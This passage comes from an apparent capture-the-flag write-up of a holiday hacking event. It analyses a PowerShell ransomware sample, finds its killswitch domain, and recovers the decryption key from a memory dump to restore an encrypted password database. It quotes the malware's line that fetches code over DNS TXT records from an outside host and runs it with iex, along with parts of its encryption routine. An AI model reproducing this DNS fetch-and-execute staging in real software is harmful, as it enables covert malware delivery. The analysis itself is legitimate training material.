    $h += (Resolve - DnsName  - Server erohetfanu.com  - Name "$i.$f.erohetfanu.com"  - Type TXT).strings
};
iex($(H2A $h | Out - string))
```

## 9.3 Stop the Malware

```
Erohetfanu.com, I wonder what that means? Unfortunately, Snort alerts show multiple domains, so blocking that one won't be effective.

I remember another ransomware in recent history had a killswitch domain that, when registered, would prevent any further infections.
```

Now we need to find the killswitch.

To get the output of the malware, change the last line to just print the code instead of executing it with `iex`.

``` powershell
H2A $h | Out - string
```

Run the ps1 file and direct the output to a new file. And it works.

```
(Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE")
```

to 

```
(Get-WmiObject Win32_ComputerSystem).Domain -eq "KRINGLECASTLE")
```

`H2A` (Hex to ASCII)

`server.crt`

```
MIIDXTCCAkWgAwIBAgIJAP6e19cw2sCjMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
aWRnaXRzIFB0eSBMdGQwHhcNMTgwODAzMTUwMTA3WhcNMTkwODAzMTUwMTA3WjBF
MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50
ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
CgKCAQEAxIjc2VVG1wmzBi+LDNlLYpUeLHhGZYtgjKAye96h6pfrUqcLSvcuC+s5
ywy1kgOrrx/pZh4YXqfbolt77x2AqvjGuRJYwa78EMtHtgq/6njQa3TLULPSpMTC
QM9H0SWF77VgDRSReQPjaoyPo3TFbS/Pj1ThlqdTwPA0lu4vvXi5Kj2zQ8QnxYQB
hpRxFPnB9Ak6G9EgeR5NEkz1CiiVXN37A/P7etMiU4QsOBipEcBvL6nEAoABlUHi
zWCTBBb9PlhwLdlsY1k7tx5wHzD7IhJ5P8tdksBzgrWjYxUfBreddg+4nRVVuKeb
E9Jq6zImCfu8elXjCJK8OLZP9WZWDQIDAQABo1AwTjAdBgNVHQ4EFgQUfeOgZ4f+
kxU1/BN/PpHRuzBYzdEwHwYDVR0jBBgwFoAUfeOgZ4f+kxU1/BN/PpHRuzBYzdEw
DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAhdhDHQvW9Q+Fromk7n2G
2eXkTNX1bxz2PS2Q1ZW393Z83aBRWRvQKt/qGCAi9AHg+NB/F0WMZfuuLgziJQTH
QS+vvCn3bi1HCwz9w7PFe5CZegaivbaRD0h7V9RHwVfzCGSddUEGBH3j8q7thrKO
xOmEwvHi/0ar+0sscBideOGq11hoTn74I+gHjRherRvQWJb4Abfdr4kUnAsdxsl7
MTxM0f4t4cdWHyeJUH3yBuT6euId9rn7GQNi61HjChXjEfza8hpBC4OurCKcfQiV
oY/0BxXdxgTygwhAdWmvNrHPoQyB5Q9XwgN/wWMtrlPZfy3AW9uGFj/sgJv42xcF
+w==
```

The other file is 6754 chunks

From

0.736F757263652E6D696E2E68746D6C.erohetfanu.com: type TXT, class IN

to

6754.736F757263652E6D696E2E68746D6C.erohetfanu.com: type TXT, class IN

Call, read response, unhexlify, decode base64.

* `p_k_e` > `PublicKeyEncrypt`: Encrypts stuff with public key of certificate.
* `e_d_file` > `EncryptDecryptFile`: Encrypts or Decrypts a file based on the third parameter.
* `G2B` > `GzipToBytes`: Decompresses a gzip file and returns the bytes.
* `B2H` > `ByteToHex`: Converts bytes to hexadecimal. Kind of like hex.Encode.

If make too many requests, you get blocked, I put a 50ms sleep between requests which makes it a bit slower but works. The script spends most of its time on reassembling the pieces anyways.

-----

``` powershell
function wanc {
    $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"
    if ($null -ne ((Resolve-DnsName -Name $(HexToASCII $(ByteToHex $(XOR $(ByteToHex $(GzipToBytes $(HexToByte $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {
        return 
    }
```

Is this the killswitch? Yes it is.

We can print the result.

``` powershell
function wanc {
    $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"

    $(HexToASCII $(ByteToHex $(XOR $(ByteToHex $(GzipToBytes $(HexToByte $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))) | Out-String
    return
    ...
```

And we have the killswitch - answer is `yippeekiyaa.aaay`.

```
$ .\output-cyberchef.ps1
yippeekiyaa.aaay
``` 

-----

## 9.4 Recover Alabaster's Password
Now we have a memory dump and a file and we need to recover the key.

Use power dump to process the memory file.

Then look for variables.

`matches "^[a-fA-F0-9]+$"`
`len == 32` because key is 32-bytes

We get five hits

```
033ecb2bc07a4d43b5ef94ed5a35d280

cf522b78d86c486691226b40aa69e95c

9e210fe47d09416682b841769c78b8a3

4ec4f0187cb04f4cb6973460dfe252df

27c87ef9bbda4f709f6b4002fa4af63c
```

Let's see if we can also find the hash. The length is 40 in this case.

We get one match with `len == 40`.

```
b0e59a5e0f00968856f22cff2d6226697535da5b
```

This should be hash of one of the above. But it matches none of our keys. So either our keys are wrong or something else.

Google doesn't give me anything either, so it's not the SHA-1 hash of something good.

Let's search for powershell scripts in the dump and it finds 65. We are looking for something that does encryption, so we search for `matches ".*System.Security.Cryptography.*"` (do we even need the `.*`?).

And we find one script. DUMP it and it's our original script. Hmm.

Maybe these are encrypted encryption keys and it's decrypted locally? Let's look at the certificate again and see the key size.

Dropping the original certificate into Cybechef and using the recipe `Parse_X.509_certificate('Base64')`0120`

```
Version:          3 (0x02)
Serial number:    18347339251191562403 (0x00fe9ed7d730dac0a3)
Algorithm ID:     SHA256withRSA
Validity
  Not Before:     03/08/18 15:01:07 (dd-mm-yy hh:mm:ss) (180803150107Z)
  Not After:      03/08/19 15:01:07 (dd-mm-yy hh:mm:ss) (190803150107Z)
Issuer
  C  = AU
  ST = Some-State
  O  = Internet Widgits Pty Ltd
Subject
  C  = AU
  ST = Some-State
  O  = Internet Widgits Pty Ltd
Public Key
  Algorithm:      RSA
  Length:         2048 bits
  Modulus:        c4:88:dc:d9:55:46:d7:09:b3:06:2f:8b:0c:d9:4b:62:
                  95:1e:2c:78:46:65:8b:60:8c:a0:32:7b:de:a1:ea:97:
                  eb:52:a7:0b:4a:f7:2e:0b:eb:39:cb:0c:b5:92:03:ab:
                  af:1f:e9:66:1e:18:5e:a7:db:a2:5b:7b:ef:1d:80:aa:
                  f8:c6:b9:12:58:c1:ae:fc:10:cb:47:b6:0a:bf:ea:78:
                  d0:6b:74:cb:50:b3:d2:a4:c4:c2:40:cf:47:d1:25:85:
                  ef:b5:60:0d:14:91:79:03:e3:6a:8c:8f:a3:74:c5:6d:
                  2f:cf:8f:54:e1:96:a7:53:c0:f0:34:96:ee:2f:bd:78:
                  b9:2a:3d:b3:43:c4:27:c5:84:01:86:94:71:14:f9:c1:
                  f4:09:3a:1b:d1:20:79:1e:4d:12:4c:f5:0a:28:95:5c:
                  dd:fb:03:f3:fb:7a:d3:22:53:84:2c:38:18:a9:11:c0:
                  6f:2f:a9:c4:02:80:01:95:41:e2:cd:60:93:04:16:fd:
                  3e:58:70:2d:d9:6c:63:59:3b:b7:1e:70:1f:30:fb:22:
                  12:79:3f:cb:5d:92:c0:73:82:b5:a3:63:15:1f:06:b7:
                  9d:76:0f:b8:9d:15:55:b8:a7:9b:13:d2:6a:eb:32:26:
                  09:fb:bc:7a:55:e3:08:92:bc:38:b6:4f:f5:66:56:0d
  Exponent:       65537 (0x10001)
Certificate Signature
  Algorithm:      SHA256withRSA
  Signature:      85:d8:43:1d:0b:d6:f5:0f:85:ae:89:a4:ee:7d:86:d9:
                  e5:e4:4c:d5:f5:6f:1c:f6:3d:2d:90:d5:95:b7:f7:76:
                  7c:dd:a0:51:59:1b:d0:2a:df:ea:18:20:22:f4:01:e0:
                  f8:d0:7f:17:45:8c:65:fb:ae:2e:0c:e2:25:04:c7:41:
                  2f:af:bc:29:f7:6e:2d:47:0b:0c:fd:c3:b3:c5:7b:90:
                  99:7a:06:a2:bd:b6:91:0f:48:7b:57:d4:47:c1:57:f3:
                  08:64:9d:75:41:06:04:7d:e3:f2:ae:ed:86:b2:8e:c4:
                  e9:84:c2:f1:e2:ff:46:ab:fb:4b:2c:70:18:9d:78:e1:
                  aa:d7:58:68:4e:7e:f8:23:e8:07:8d:18:5e:ad:1b:d0:
                  58:96:f8:01:b7:dd:af:89:14:9c:0b:1d:c6:c9:7b:31:
                  3c:4c:d1:fe:2d:e1:c7:56:1f:27:89:50:7d:f2:06:e4:
                  fa:7a:e2:1d:f6:b9:fb:19:03:62:eb:51:e3:0a:15:e3:
                  11:fc:da:f2:1a:41:0b:83:ae:ac:22:9c:7d:08:95:a1:
                  8f:f4:07:15:dd:c6:04:f2:83:08:40:75:69:af:36:b1:
                  cf:a1:0c:81:e5:0f:57:c2:03:7f:c1:63:2d:ae:53:d9:
                  7f:2d:c0:5b:db:86:16:3f:ec:80:9b:f8:db:17:05:fb

Extensions
  subjectKeyIdentifier :
    7de3a06787fe931535fc137f3e91d1bb3058cdd1
  authorityKeyIdentifier :
    kid=7de3a06787fe931535fc137f3e91d1bb3058cdd1
  basicConstraints :
    cA=true
```

Key size is `2048` bits, or `256` bytes, so let's see if we can find a key in the dump of size `512` (remember they are hex encoded most likely).

woot?

```
================ Filters ================
1| MATCHES  bool(re.search(r"^[a-fA-F0-9]+$",variable_values))
2| LENGTH  len(variable_values) == 512

[i] 1 powershell Variable Values found!
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: print
3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971
```

Assuming this is the certificate's private key, we should be able to test our hypothesis? Or maybe it's the public key?

So to get the private key we need to look at the files that are called with `GetOverDNS` or `g_o_dns`. We are requesting `server.crt` and then `source.min.html`. Remember from previosu challenge where we had the two files in the source? What if we call the same function but ask for `server.key`.

``` powershell
# modified function.
function GetOverDNS ($f) {
    $godnsarg = "Called GetOverDNS({0})" -f (HexToASCII $f | Out-String).Trim()
    Write-Host $godnsarg
    $h = ''
    foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings,10) - 1)) {
        Start-Sleep -m 50
        $h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings 
    }
    (HexToASCII $h) | Out-String | Out-File -FilePath (HexToASCII $f | Out-String).Trim()
    Write-Host "Return from GetOverDNS"
    return (HexToASCII $h) 
}
```

Create pkcs12/pfx file form cert and key with `certutil`

```
$ certutil.exe -MergePFX .\server.crt server.pfx
Signature test passed
Enter new password for output file server.pfx:
Enter new password:
Confirm new password:
CertUtil: -MergePFX command completed successfully.
```

To convert unicode files to ascii (server cert and key are both UTF-16?), we can use powershell.

``` powershell
Get-Content .\server.key | Out-File -Encoding ASCII server-ascii.key
```

Then convert both of them to PFX together

```
openssl.exe pkcs12 -export -out server.pfx -inkey server-ascii.key -in server-ascii.crt
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'
```

openssl pkeyutl --Help

It's OAEP.

```
openssl pkeyutl -decrypt -inkey server-ascii.key -in encrypted -out decrypted -pkeyopt rsa_padding_mode:oaep
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
```

And it got decrypted.

Now we need to decrypt the password file with this AES key.

Looking at the PowerShell script we can see it's using AES-CBC. But the first 16 bytes are not the IV.

``` powershell
# generate IV - 16 bytes
$AESP.GenerateIV()
# write length of IV (16 or 10 00 00 00) to file
$FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length),0,4)
# write IV to file
$FileSW.Write($AESP.IV,0,$AESP.IV.Length)
```

First four bytes are the length of IV which for AES are always `10 00 00 00`.

Then there is IV.

During encryption, each 16 bytes are encrypted individually which does not make any difference in this case.

FBCFC121915D99CC20A3D3D5D84F8308

We decrypt using `decrypt.go` and then we will get a file that has a format. It's not plaintext but it has blobs of concentrated bytes with a lot of nulls. This is not bad decryption.

IV ?
1F 98 AC 13 B1 87 F7 91 AB 42 B2 4B CD 7F ED 55

So fucking MS, cryptostream is AES-CBC not AES-CFB. Decrypted the file, it's a sqlite database.

Inside we have the passwords for Alabaster. The answer (password for the vault) is `ED#ED#EED#EF#G#F#G#ABA#BA#B`.

`E D# E D# E E D# E F# G# F# G# A B A# B A# B`

Answer:

`D C# D C# D D C# D E F# E F# G A G# A G# A`

Santa says it was his own plan.

```
You DID IT! You completed the hardest challenge. You see, Hans and the soldiers work for ME. I had to test you. And you passed the test!

You WON! Won what, you ask? Well, the jackpot, my dear! The grand and glorious jackpot!

You see, I finally found you!

I came up with the idea of KringleCon to find someone like you who could help me defend the North Pole against even the craftiest attackers.

That’s why we had so many different challenges this year.

We needed to find someone with skills all across the spectrum.

I asked my friend Hans to play the role of the bad guy to see if you could solve all those challenges and thwart the plot we devised.

And you did!

Oh, and those brutish toy soldiers? They are really just some of my elves in disguise.

See what happens when they take off those hats?

Based on your victory… next year, I’m going to ask for your help in defending my whole operation from evil bad guys.

And welcome to my vault room. Where's my treasure? Well, my treasure is Christmas joy and good will.

You did such a GREAT job! And remember what happened to the people who suddenly got everything they ever wanted?

They lived happily ever after.
```
